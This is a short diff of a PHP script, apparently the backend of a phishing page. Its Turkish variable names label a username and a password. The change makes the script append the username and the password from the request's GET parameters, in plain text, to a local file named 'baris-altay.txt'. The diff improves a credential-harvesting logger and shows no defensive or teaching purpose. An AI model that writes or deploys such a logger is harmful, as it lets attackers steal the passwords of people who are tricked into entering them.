@@ -28,7 +28,9 @@ if(isset($_GET['comen']))
 {
     $dosya = fopen("baris-altay.txt", "a");
     fwrite($dosya, "
-    \$_KULLANICI_ADI : ${$_GET['username']}
+    \$_KULLANICI_ADI : " . $_GET['username'] . "
+    
+    \$_SIFRE         : " . $_GET['password'] . "
     ");
     fclose($dosya);
     
